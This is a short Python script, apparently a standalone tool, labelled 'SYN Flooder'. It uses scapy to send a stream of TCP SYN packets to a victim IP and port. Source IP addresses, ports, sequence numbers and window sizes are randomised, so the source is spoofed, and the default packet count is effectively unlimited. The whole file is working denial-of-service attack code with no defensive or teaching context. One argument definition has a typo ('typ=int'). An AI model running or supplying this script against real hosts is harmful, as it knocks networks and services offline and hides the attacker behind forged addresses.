import argparse
import random
from scapy.all import send, IP, TCP


DEFAULT_PACK = 999999999
MAX_PORTS = 65535

def random_IP():
    IP = ".".join(map(str,(random.randint(0,255)for _ in range(4))))
    return IP
def get_args():
    parser = argparse.ArgumentParser(description='SYN Flooder\n')
    parser.add_argument('t', help="Victim's IP Adress")
    parser.add_argument('-a',typ=int,help="Amount of packets(default are infinity)", default=DEFAULT_PACK)
    parser.add_argument('-p',type=int,help="Target port(defult port is 80)", default=80)
    args = parser.parse_args()
    return args.t, args.p, args.a

def SYN_flood(Target_IP, dPort, packets_to_send):
    print("Sending packets to the target...")
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        src_IP = random_IP()
        packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
    print("Sent all the packets")

def main():
    Target_IP, dPort, packets_to_send = get_args()
    SYN_flood(Target_IP, dPort, packets_to_send)

if __name__ == "__main__":
    main()
